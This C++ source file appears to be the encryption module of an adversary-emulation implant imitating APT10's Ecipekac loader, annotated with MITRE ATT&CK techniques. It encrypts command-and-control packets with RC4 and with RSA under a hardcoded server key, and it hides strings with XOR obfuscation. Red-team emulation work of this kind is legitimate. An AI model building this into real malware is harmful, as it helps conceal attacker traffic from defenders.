#include "EncUtils.h"


//  GenerateRC4Key()
//      About:
//         Generates a random RC4 key
//      Result:
//          [CryptoPP::SecByteBlock] Returns the RC4 key bytes
//      MITRE ATT&CK Techniques:
//          T1573.001: Encrypted Channel: Symmetric Encryption
//      CTI:
//          http://jsac.jpcert.or.jp/archive/2022/pdf/JSAC2022_9_yanagishita-tamada-nakatsuru-ishimaru_en.pdf
//          https://securelist.com/apt10-sophisticated-multi-layered-loader-ecipekac-discovered-in-a41apt-campaign/101519/
CryptoPP::SecByteBlock GenerateRC4Key() {
    CryptoPP::AutoSeededRandomPool prng;
    // Create a byte array and generate a random key
    CryptoPP::SecByteBlock key(16);
    prng.GenerateBlock(key, key.size());

    return key;
}

//  RC4KeyToString(CryptoPP::SecByteBlock key)
//      About:
//         Takes a CryptoPP SecByteBlock key and converts it to a string.
//      Result:
//          [std::string] Returns the RC4 key as a string
//      MITRE ATT&CK Techniques:
//          T1573.001: Encrypted Channel: Symmetric Encryption
std::string RC4KeyToString(CryptoPP::SecByteBlock key) {
    std::string stringKey;

    CryptoPP::HexEncoder encoder(new CryptoPP::StringSink(stringKey));
    encoder.Put((const CryptoPP::byte*)key.data(), key.size());
    encoder.MessageEnd();

    if (DEBUG_MSG)
        writeToFile(XorStr("RC4 Key String: ") + stringKey);

    return stringKey;
}


//  RC4EncryptString(std::string plain, CryptoPP::SecByteBlock key)
//      About:
//         Takes a plaintext string and an RC4 key, then encrypts the string and returns an rc4 encrypted cipher string.
//      Result:
//          [std::string] Returns an encrypted cipher string
//      MITRE ATT&CK Techniques:
//          T1573.001: Encrypted Channel: Symmetric Encryption
//      CTI:
//          http://jsac.jpcert.or.jp/archive/2022/pdf/JSAC2022_9_yanagishita-tamada-nakatsuru-ishimaru_en.pdf
//          https://securelist.com/apt10-sophisticated-multi-layered-loader-ecipekac-discovered-in-a41apt-campaign/101519/
std::string RC4EncryptString(std::string plain, CryptoPP::SecByteBlock key) {
    std::string cipher, b64EncodedData, finalPayload;

    // Base64 encode packet data
    b64EncodedData = base64_encode_string(plain);
    // Encryption object
    CryptoPP::Weak::ARC4::Encryption enc;
    enc.SetKey(key, key.size());

    cipher.resize(b64EncodedData.size());
    enc.ProcessData((CryptoPP::byte*)&cipher[0], (const CryptoPP::byte*)&b64EncodedData[0], b64EncodedData.size());

    // Base64 encode encrypted data
    std::string b64final;
    b64final = base64_encode_string(cipher);

    b64final.erase(std::remove(b64final.begin(), b64final.end(), '\n'),
        b64final.end());
    return b64final;
}

//  RC4DecryptString(std::string cipher, CryptoPP::SecByteBlock key)
//      About:
//         Takes an RC4 encrypted string and an RC4 key, then decrypts the string and returns a plaintext string.
//      Result:
//          [std::string] Returns plaintext decrypted string
//      MITRE ATT&CK Techniques:
//          T1573.001: Encrypted Channel: Symmetric Encryption
//      CTI:
//          http://jsac.jpcert.or.jp/archive/2022/pdf/JSAC2022_9_yanagishita-tamada-nakatsuru-ishimaru_en.pdf
//          https://securelist.com/apt10-sophisticated-multi-layered-loader-ecipekac-discovered-in-a41apt-campaign/101519/
std::string RC4DecryptString(std::string cipher, CryptoPP::SecByteBlock key) {
    std::string recover, decoded, decoded2;
    CryptoPP::StringSource ss2(cipher, true,
        new CryptoPP::Base64Decoder(
            new CryptoPP::StringSink(decoded)
        )
    );

    CryptoPP::Weak::ARC4::Decryption dec;
    dec.SetKey(key, key.size());

    // Perform the decryption
    recover.resize(decoded.size());
    dec.ProcessData((CryptoPP::byte*)&recover[0], (const CryptoPP::byte*)&decoded[0], decoded.size());

    CryptoPP::StringSource ss3(recover, true,
        new CryptoPP::Base64Decoder(
            new CryptoPP::StringSink(decoded2)
        )
    );


    return decoded2;
}

//  RSAEncrypt(CryptoPP::SecByteBlock aes_key)
//      About:
//          Helper function performing RSA encryption on the provided string data.
//      Result:
//          Vector char representing the encrypted data
//      MITRE ATT&CK Techniques:
//          T1573.002 Encrypted Channel: Asymmetric Cryptography
std::vector<char> RSAEncrypt(std::string packet_data) {
    std::string encrypted, decrypted, encoded, b64EncodedData;

    // Load server's RSA public key
    std::string pub_str = XorStr("MIIBCgKCAQEAvIXC/uSF6GaQkOzFjS9CSVeklJT1rrtwBivASNV3ZjPWdivJeUzkIeKHuoGQrg3ehAoF0ktiVTKzY9S7CJu6cRVCXRC7Gpp8cl/wa1XdtnRnbz9Ltt+GSmywxGrsLCvNfPxZGUPbrJa/HBmZk/dbDhCwwszE2o0l5r/oVOnDUceJV4wTX8hFDpz+PrIIPm4WbtCDJUo9PhXGojSploCacJPE6EtMpWZAFdrsR4qJ3q64YCR4o8aK5Ag+Pda+MxYtvm6NL+JzPpd2Ww7ZFKOvA3F0bABccP0cA3a5rs11FOotVe6roK9sUYbaagVkREU84W4tFDYTgvi5MXwzprXJqQIDAQAB");
    CryptoPP::StringSource pub_ss{ pub_str.c_str(), true };
    CryptoPP::ByteQueue queue;
    CryptoPP::Base64Decoder decoder;
    decoder.Attach(new CryptoPP::Redirector(queue));
    pub_ss.TransferTo(decoder);
    decoder.MessageEnd();
    CryptoPP::RSA::PublicKey publicKey;
    publicKey.BERDecodePublicKey(queue, false, queue.MaxRetrievable());

    // Base64 encode packet data
    b64EncodedData = base64_encode_string(packet_data);
    // RSA encrypt packet data
    CryptoPP::AutoSeededRandomPool prng;
    CryptoPP::RSAES_OAEP_SHA_Encryptor rsaEncryptor(publicKey);
    if (DEBUG_MSG)
        writeToFile(XorStr("Encrypting Packet Data"));
    CryptoPP::StringSource(b64EncodedData, true,
        new CryptoPP::PK_EncryptorFilter(prng, rsaEncryptor,
            new CryptoPP::StringSink(encrypted)));

    // Base64 encode RSA encrypted data
    encoded = base64_encode_string(encrypted);

    if (DEBUG_MSG)
        writeToFile(XorStr("Base64 Data: ") + encoded);

    std::vector<char> result(encoded.begin(), encoded.end());

    return result;
}